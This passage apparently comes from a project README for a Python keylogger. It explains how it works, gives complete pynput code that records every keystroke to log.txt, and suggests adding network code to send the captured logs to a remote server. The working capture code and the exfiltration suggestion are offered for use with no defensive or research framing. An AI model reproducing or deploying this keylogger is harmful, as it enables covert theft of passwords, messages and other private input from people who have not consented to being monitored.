üõ†Ô∏è Usage

Viewing Logs

The keystrokes will be saved in a file named log.txt located in the same directory.
Open log.txt to view the captured keystrokes.
üßê How It Works
This keylogger uses the pynput library to listen for keyboard events.
Every time a key is pressed:
Alphanumeric characters are logged directly.
Special keys (like space, enter, and tab) are logged with their respective actions.
The captured keystrokes are stored in a log.txt file for analysis.
Sample Code Snippet
python
Copy code
from pynput.keyboard import Key, Listener

def write_file(char):
    with open('log.txt', 'a') as f:
        f.write(char)

def on_press(key):
    try:
        if key.char:
            write_file(key.char)
    except AttributeError:
        if key == Key.space:
            write_file(' ')
        elif key == Key.enter:
            write_file('\n')

with Listener(on_press=on_press) as listener:
    listener.join()
‚öôÔ∏è Customization
Change Log File Name:
Modify the log.txt to any preferred filename in the write_file function.
Add Network Capability:
You can extend this script to send logs to a remote server using the requests library.
